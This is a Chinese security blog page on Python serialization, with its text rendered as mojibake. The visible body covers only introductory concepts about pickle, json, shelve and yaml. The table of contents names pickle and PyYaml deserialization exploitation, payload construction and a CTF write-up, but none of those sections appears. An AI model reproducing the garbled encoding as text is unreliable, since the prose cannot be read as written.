<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="ä¸¨Mr.zhangä¸¨"><meta name="copyright" content="ä¸¨Mr.zhangä¸¨"><meta name="generator" content="Hexo 5.4.0"><meta name="theme" content="hexo-theme-yun"><title>pythonåºåˆ—åŒ–ä¸ååºåˆ—åŒ– | Mr.zhang's Blog</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/star-markdown-css@0.1.24/dist/yun/yun-markdown.min.css"><script src="//at.alicdn.com/t/font_1140697_ed8vp4atwoj.js" async></script><script src="https://cdn.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>document.addEventListener("DOMContentLoaded", () => {
  [".post-card",".post-content img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
});
</script><link id="light-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism.css" media="(prefers-color-scheme: light)"><link id="dark-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism-tomorrow.css" media="(prefers-color-scheme: dark)"><link rel="shortcut icon" type="image/svg+xml" href="/yun.svg"><link rel="mask-icon" href="/yun.svg" color="#0078E7"><link rel="alternate icon" href="/yun.ico"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="preload" href="/js/utils.js" as="script"><link rel="preload" href="/js/hexo-theme-yun.js" as="script"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><script id="yun-config">
    const Yun = window.Yun || {};
    window.CONFIG = {"hostname":"www.greetdawn.top","root":"/","title":"ç¾¤å“¥çš„åšå®¢","version":"1.5.2","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"æœç´¢...","empty":"æ‰¾ä¸åˆ°æ‚¨æŸ¥è¯¢çš„å†…å®¹: ${query}","hits":"æ‰¾åˆ° ${hits} æ¡ç»“æœ","hits_time":"æ‰¾åˆ° ${hits} æ¡ç»“æœï¼ˆç”¨æ—¶ ${time} æ¯«ç§’ï¼‰"},"anonymous_image":"https://cdn.jsdelivr.net/gh/YunYouJun/cdn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"fireworks":{"colors":["102, 167, 221","62, 131, 225","33, 78, 194"]}};
  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/utils.js"></script><script src="/js/hexo-theme-yun.js"></script><link rel="alternate" href="/atom.xml" title="Mr.zhang's Blog" type="application/atom+xml"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin><script async src="https://www.googletagmanager.com/gtag/js?id=UA-121354150-1"></script><script>if (CONFIG.hostname === location.hostname) {
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());
  gtag('config', 'UA-121354150-1');
}</script><script data-ad-client="ca-pub-2245427233262012" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script>(function(){
  var bp = document.createElement('script');
  var curProtocol = window.location.protocol.split(':')[0];
  if (curProtocol === 'https') {
    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
  }
  else {
    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
  }
  var s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(bp, s);
})();</script><!-- Google Tag Manager --><script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-M9KWR9L');</script><!-- End Google Tag Manager --><meta property="og:type" content="article">
<meta property="og:title" content="pythonåºåˆ—åŒ–ä¸ååºåˆ—åŒ–">
<meta property="og:url" content="http://www.greetdawn.top/2021/02/24/python-code-audit/python-unserialize/index.html">
<meta property="og:site_name" content="Mr.zhang&#39;s Blog">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/akita-5964180_1920.jpg">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/python_unserialize.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210218113123136.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210218132059917.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/20200320230631-6204866e-6abc-1.gif">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200320230711-7972c0ea-6abc-1.gif">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210218164929904.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210219092045080.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210219095145179.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210220105856952.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210220165100857.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210222151603695.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210222151706568.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210222151902135.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210222152104854.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210222153543892.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210222153723888.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210222154330095.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210222154718086.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210222161340815.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210223093503733.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210223093654970.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210223094845756.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210223100750055.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210223111223199.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210223111525518.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210223111626157.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210223112357209.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210223112541297.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210223163820292.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210223165835716.png">
<meta property="article:published_time" content="2021-02-24T03:22:00.000Z">
<meta property="article:modified_time" content="2021-02-24T03:27:14.102Z">
<meta property="article:author" content="ä¸¨Mr.zhangä¸¨">
<meta property="article:tag" content="Pickle">
<meta property="article:tag" content="PyYaml">
<meta property="article:tag" content="ååºåˆ—åŒ–">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/akita-5964180_1920.jpg"><script src="/js/ui/mode.js"></script></head><body><script defer src="https://cdn.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="æ–‡ç« ç›®å½•"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-list-ordered"></use></svg></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="ç«™ç‚¹æ¦‚è§ˆ"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-passport-line"></use></svg></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="ä¸¨Mr.zhangä¸¨"><img width="96" loading="lazy" src="/images/avatar.jpg" alt="ä¸¨Mr.zhangä¸¨"><span class="site-author-status" title="ä¸æƒ³ä¸Šç­">ğŸ˜­</span></a><div class="site-author-name"><a href="/about/">ä¸¨Mr.zhangä¸¨</a></div><a class="site-name" href="/about/site.html">Mr.zhang's Blog</a><sub class="site-subtitle">The God love people</sub><div class="site-desciption">Love coding,Love life!</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="é¦–é¡µ"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-home-4-line"></use></svg></span></a><div class="site-state-item"><a href="/archives/" title="å½’æ¡£"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-archive-line"></use></svg></span><span class="site-state-item-count">44</span></a></div><div class="site-state-item"><a href="/categories/" title="åˆ†ç±»"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-2-line"></use></svg></span><span class="site-state-item-count">14</span></a></div><div class="site-state-item"><a href="/tags/" title="æ ‡ç­¾"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="site-state-item-count">43</span></a></div><a class="site-state-item hty-icon-button" href="/about/#comment" title="ç•™è¨€æ¿"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-clipboard-line"></use></svg></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://wpa.qq.com/msgrd?v=3&amp;uin=910426929&amp;site=qq&amp;menu=yes" title="QQ" target="_blank" style="color:#12B7F5"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-qq-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/greetdawn" title="GitHub" target="_blank" style="color:#181717"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-github-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:953640552@qq.com" title="E-Mail" target="_blank" style="color:#8E71C1"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-mail-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://weibo.com/" title="å¾®åš" target="_blank" style="color:#E6162D"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-weibo-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://music.163.com/#/user/home?id=372656460" title="ç½‘æ˜“äº‘éŸ³ä¹" target="_blank" style="color:#C10D0C"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-netease-cloud-music-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://www.zhihu.com/" title="çŸ¥ä¹" target="_blank" style="color:#0084FF"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-zhihu-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://space.bilibili.com/478304087" title="å“”å“©å“”å“©åŠ¨ç”»" target="_blank" style="color:#FF8EB3"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-bilibili-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://twitter.com/" title="Twitter" target="_blank" style="color:#1da1f2"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-twitter-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://t.me/" title="Telegram" target="_blank" style="color:#0088CC"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-telegram-line"></use></svg></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="æˆ‘çš„å°ä¼™ä¼´ä»¬" style="color:dodgerblue"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-genderless-line"></use></svg></a><a class="links-item hty-icon-button" href="/girls/" title="å–œæ¬¢çš„å¥³å­©å­" style="color:hotpink"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-women-line"></use></svg></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-contrast-2-line"></use></svg></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text">åŸºç¡€çŸ¥è¯†</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B"><span class="toc-number">1.1.</span> <span class="toc-text">åºåˆ—åŒ–ä¸ååºåˆ—åŒ–æµç¨‹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%A6%82%E5%BF%B5"><span class="toc-number">1.2.</span> <span class="toc-text">åºåˆ—åŒ–ä¸ååºåˆ—åŒ–æ¦‚å¿µ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E7%9B%AE%E7%9A%84"><span class="toc-number">1.3.</span> <span class="toc-text">åºåˆ—åŒ–çš„ç›®çš„</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#python%E4%B8%AD%E5%BA%8F%E5%88%97%E5%8C%96%E6%A8%A1%E5%9D%97"><span class="toc-number">1.4.</span> <span class="toc-text">pythonä¸­åºåˆ—åŒ–æ¨¡å—</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pickle%E6%A8%A1%E5%9D%97%E8%AF%A6%E8%A7%A3"><span class="toc-number">2.</span> <span class="toc-text">pickleæ¨¡å—è¯¦è§£</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pickle%E5%9F%BA%E7%A1%80"><span class="toc-number">2.1.</span> <span class="toc-text">pickleåŸºç¡€</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pickle%E5%8F%AF%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%AF%B9%E8%B1%A1"><span class="toc-number">2.2.</span> <span class="toc-text">pickleå¯åºåˆ—åŒ–çš„å¯¹è±¡</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#object-reduce-%E5%87%BD%E6%95%B0"><span class="toc-number">2.3.</span> <span class="toc-text">object.__reduce__å‡½æ•°</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pickle%E8%BF%87%E7%A8%8B%E8%AF%A6%E8%A7%A3"><span class="toc-number">2.4.</span> <span class="toc-text">pickleè¿‡ç¨‹è¯¦è§£</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#opcode%E7%89%88%E6%9C%AC"><span class="toc-number">2.5.</span> <span class="toc-text">opcodeç‰ˆæœ¬</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pickletools"><span class="toc-number">2.6.</span> <span class="toc-text">pickletools</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.</span> <span class="toc-text">pickleååºåˆ—åŒ–æ¼æ´</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%8F%8F%E8%BF%B0"><span class="toc-number">3.1.</span> <span class="toc-text">åŸºæœ¬æè¿°</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BA%A7%E7%94%9F%E7%9A%84%E5%9C%BA%E6%99%AF"><span class="toc-number">3.2.</span> <span class="toc-text">æ¼æ´äº§ç”Ÿçš„åœºæ™¯</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.3.</span> <span class="toc-text">æ¼æ´åˆ©ç”¨</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pyaload%E6%9E%84%E9%80%A0"><span class="toc-number">3.4.</span> <span class="toc-text">pyaloadæ„é€ </span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-Day1-Web2"><span class="toc-number">4.</span> <span class="toc-text">ciscn 2019 Day1 Web2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87"><span class="toc-number">4.1.</span> <span class="toc-text">é€»è¾‘æ¼æ´ç»•è¿‡</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JWT%E4%BC%AA%E9%80%A0"><span class="toc-number">4.2.</span> <span class="toc-text">JWTä¼ªé€ </span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">4.3.</span> <span class="toc-text">pickleååºåˆ—åŒ–</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PyYaml%E6%A8%A1%E5%9D%97%E8%AF%A6%E8%A7%A3"><span class="toc-number">5.</span> <span class="toc-text">PyYamlæ¨¡å—è¯¦è§£</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PyYaml%E5%9F%BA%E7%A1%80"><span class="toc-number">5.1.</span> <span class="toc-text">PyYamlåŸºç¡€</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PyYaml%E4%B8%AD%E7%9A%84%E6%A0%BC%E5%BC%8F"><span class="toc-number">5.2.</span> <span class="toc-text">PyYamlä¸­çš„æ ¼å¼</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PyYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">5.3.</span> <span class="toc-text">PyYamlååºåˆ—åŒ–æ¼æ´åˆ†æ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PyYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">5.4.</span> <span class="toc-text">PyYamlååºåˆ—åŒ–æ¼æ´åˆ©ç”¨</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8payload%E6%B1%87%E6%80%BB"><span class="toc-number">5.5.</span> <span class="toc-text">å¸¸ç”¨payloadæ±‡æ€»</span></a></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article"><link itemprop="mainEntityOfPage" href="http://www.greetdawn.top/2021/02/24/python-code-audit/python-unserialize/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="ä¸¨Mr.zhangä¸¨"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="Mr.zhang's Blog"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">pythonåºåˆ—åŒ–ä¸ååºåˆ—åŒ–<a class="post-edit-link" href="https://github.com/greetdawn/_posts/python-code-audit/python-unserialize.md" target="_blank" title="ç¼–è¾‘" rel="noopener"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-edit-line"></use></svg></a></h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-line"></use></svg></span> <time title="åˆ›å»ºæ—¶é—´ï¼š2021-02-24 11:22:00" itemprop="dateCreated datePublished" datetime="2021-02-24T11:22:00+08:00">2021-02-24</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="æœ¬æ–‡å­—æ•°"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-file-word-line"></use></svg></span> <span title="æœ¬æ–‡å­—æ•°">4.5k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="é˜…è¯»æ—¶é•¿"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-timer-line"></use></svg></span> <span title="é˜…è¯»æ—¶é•¿">18m</span></span></span><span class="leancloud_visitors" id="/2021/02/24/python-code-audit/python-unserialize/" data-flag-title="pythonåºåˆ—åŒ–ä¸ååºåˆ—åŒ–"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="é˜…è¯»æ¬¡æ•°"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-eye-line"></use></svg> <span class="leancloud-visitors-count"></span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-line"></use></svg></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category" href="/categories/python%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">pythonä»£ç å®¡è®¡</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag" href="/tags/Pickle/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">Pickle</span></a><a class="tag" href="/tags/PyYaml/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">PyYaml</span></a><a class="tag" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">ååºåˆ—åŒ–</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body" style="--smc-primary:#0078E7;"><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/akita-5964180_1920.jpg" alt="akita-5964180_1920" loading="lazy"></p>
<span id="more"></span>



<h2 id="åŸºç¡€çŸ¥è¯†"><a href="#åŸºç¡€çŸ¥è¯†" class="headerlink" title="åŸºç¡€çŸ¥è¯†"></a>åŸºç¡€çŸ¥è¯†</h2><h3 id="åºåˆ—åŒ–ä¸ååºåˆ—åŒ–æµç¨‹"><a href="#åºåˆ—åŒ–ä¸ååºåˆ—åŒ–æµç¨‹" class="headerlink" title="åºåˆ—åŒ–ä¸ååºåˆ—åŒ–æµç¨‹"></a>åºåˆ—åŒ–ä¸ååºåˆ—åŒ–æµç¨‹</h3><p>Python çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ˜¯å°†ä¸€ä¸ªç±»å¯¹è±¡å‘å­—èŠ‚æµè½¬åŒ–ä»è€Œè¿›è¡Œå­˜å‚¨å’Œä¼ è¾“ï¼Œç„¶åä½¿ç”¨çš„æ—¶å€™å†å°†å­—èŠ‚æµè½¬åŒ–å›åŸå§‹çš„å¯¹è±¡çš„ä¸€ä¸ªè¿‡ç¨‹ã€‚</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/python_unserialize.png" alt="python_unserialize" loading="lazy"></p>
<h3 id="åºåˆ—åŒ–ä¸ååºåˆ—åŒ–æ¦‚å¿µ"><a href="#åºåˆ—åŒ–ä¸ååºåˆ—åŒ–æ¦‚å¿µ" class="headerlink" title="åºåˆ—åŒ–ä¸ååºåˆ—åŒ–æ¦‚å¿µ"></a>åºåˆ—åŒ–ä¸ååºåˆ—åŒ–æ¦‚å¿µ</h3><p>åœ¨ç¨‹åºè¿è¡Œçš„è¿‡ç¨‹ä¸­ï¼Œæ‰€æœ‰çš„å˜é‡å­˜å‚¨çš„æ•°æ®éƒ½æ˜¯åŠ è½½åœ¨å†…å­˜ä¸­ï¼Œä¸€æ—¦ç¨‹åºç»“æŸï¼Œæ•°æ®æ‰€å ç”¨çš„å†…å­˜å°±è¢«æ“ä½œç³»ç»Ÿå…¨éƒ¨å›æ”¶ã€‚å„ç§ç±»å‹çš„æ•°æ®ä»å†…å­˜ä¸­å˜æˆå¯å­˜å‚¨æˆ–ä¼ è¾“çš„è¿‡ç¨‹ç§°ä¹‹ä¸ºåºåˆ—åŒ–ï¼Œåºåˆ—åŒ–ä¹‹åï¼Œå°±å¯ä»¥æŠŠåºåˆ—åŒ–åçš„å†…å®¹å†™å…¥ç£ç›˜ï¼Œæˆ–è€…é€šè¿‡ç½‘ç»œä¼ è¾“åˆ°åˆ«çš„æœºå™¨ä¸Šã€‚åè¿‡æ¥ï¼ŒæŠŠæ•°æ®å†…å®¹ä»åºåˆ—åŒ–çš„å¯¹è±¡é‡æ–°è¯»åˆ°å†…å­˜é‡Œç§°ä¹‹ä¸ºååºåˆ—åŒ–ã€‚</p>
<h3 id="åºåˆ—åŒ–çš„ç›®çš„"><a href="#åºåˆ—åŒ–çš„ç›®çš„" class="headerlink" title="åºåˆ—åŒ–çš„ç›®çš„"></a>åºåˆ—åŒ–çš„ç›®çš„</h3><ul>
<li>ä»¥æŸç§å­˜å‚¨å½¢å¼ä½¿è‡ªå®šä¹‰å¯¹è±¡æŒä¹…åŒ–ï¼›</li>
<li>å°†å¯¹è±¡å¯ä»¥ä»ä¸€ä¸ªåœ°æ–¹ä¼ é€’åˆ°å¦ä¸€ä¸ªåœ°æ–¹ï¼›</li>
<li>ä½¿ç¨‹åºæ›´å…·æœ‰ç»´æŠ¤æ€§ã€‚</li>
</ul>
<h3 id="pythonä¸­åºåˆ—åŒ–æ¨¡å—"><a href="#pythonä¸­åºåˆ—åŒ–æ¨¡å—" class="headerlink" title="pythonä¸­åºåˆ—åŒ–æ¨¡å—"></a>pythonä¸­åºåˆ—åŒ–æ¨¡å—</h3><ul>
<li><p>pickle</p>
<p>pickleæ˜¯pythonä¸­å†…å»ºçš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ¨¡å—ï¼Œä¸”ä»¥äºŒè¿›åˆ¶çš„æ–¹å¼è¿›è¡Œåºåˆ—åŒ–æ•°æ®å­˜å‚¨ï¼Œpickleåºåˆ—åŒ–çš„å†…å®¹åªèƒ½ä½¿ç”¨pythonæ‰èƒ½æ“ä½œï¼Œä¸”ååºåˆ—åŒ–ä¾èµ–ä»£ç ã€‚</p>
</li>
<li><p>json</p>
<p>jsonæ˜¯ä¸€ç§è½»é‡çº§çš„æ•°æ®äº¤æ¢æ ¼å¼ï¼Œæ˜¯ä¸€ç§é€šç”¨çš„åºåˆ—åŒ–æ ¼å¼ï¼Œå…·æœ‰æ›´å¥½çš„å¯è¯»æ€§å’Œè·¨å¹³å°æ€§ã€‚</p>
</li>
<li><p>shelve </p>
<p>æ¨¡å—æ˜¯ Python3 æ–°å‡ºç°çš„æ–¹å¼ï¼Œç‰¹ç‚¹æ˜¯æ“ä½œç®€å•ï¼Œä½¿ç”¨åºåˆ—åŒ–å¥æŸ„ç›´æ¥æ“ä½œï¼Œéå¸¸æ–¹ä¾¿ã€‚ç¼ºç‚¹æ˜¯ç›®å‰ä¸å¤ªå¸¸ç”¨ã€‚</p>
</li>
<li><p>yaml</p>
<p>YAMLæ˜¯ä¸€ç§ç›´è§‚çš„èƒ½å¤Ÿè¢«ç”µè„‘è¯†åˆ«çš„çš„æ•°æ®åºåˆ—åŒ–æ ¼å¼ï¼Œå®¹æ˜“è¢«äººç±»é˜…è¯»ï¼Œå¹¶ä¸”å®¹æ˜“å’Œè„šæœ¬è¯­è¨€äº¤äº’ï¼ŒYAMLç±»ä¼¼äºXMLï¼Œä½†æ˜¯è¯­æ³•æ¯”XMLç®€å•å¾—å¤šï¼Œå¯¹äºè½¬åŒ–æˆæ•°ç»„æˆ–å¯ä»¥hashçš„æ•°æ®æ—¶æ˜¯å¾ˆç®€å•æœ‰æ•ˆçš„ã€‚</p>
</li>
</ul>
